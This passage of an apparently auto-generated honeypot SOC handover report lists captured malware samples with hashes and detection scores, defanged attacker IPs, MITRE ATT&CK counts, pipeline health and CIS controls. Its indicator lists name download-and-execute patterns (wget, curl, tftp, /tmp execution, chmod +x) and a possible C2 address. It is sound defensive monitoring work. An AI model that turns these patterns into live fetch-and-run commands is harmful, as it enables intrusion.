| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `91.233.83[.]203` | GB | Andrew Millar Ltd | **100** ⚠️ | 10 |
| `117.253.130[.]123` | IN | Wimax Project, BSNL New Delhi | **100** ⚠️ | 9 |
| `50.188.204[.]213` | US | Comcast Cable Communications, LLC | **100** ⚠️ | 50 |
| `80.251.153[.]178` | NL | Amarutu Technology Ltd | **100** ⚠️ | 3 |
| `65.181.79[.]60` | HK | PCCW IMS Ltd (PCCW Business Internet Access) | **100** ⚠️ | 50 |
| `154.223.128[.]44` | GT | AIRNET COPROPIEDAD | **100** ⚠️ | 1 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `119.160.166[.]237` | BN | eSpeed - Broadband DSL | **100** ⚠️ | 50 |
| `130.12.180[.]51` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `114.30.180[.]58` | KR | HVHonam | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 345 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 334 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 34 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 34 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 31 |

---

## 🔕 False Positive Summary (15 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 2 below threshold 25 | 3 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 4413 cases |
| Tool 34  | Credential Extractor        | ✅ 351 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 10 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 81 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 15 filtered (0.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 63 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 334 priority case(s) shown individually · 25 recon entry/entries in table (8 group(s) consolidating 4047 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-16T20:27:07Z_
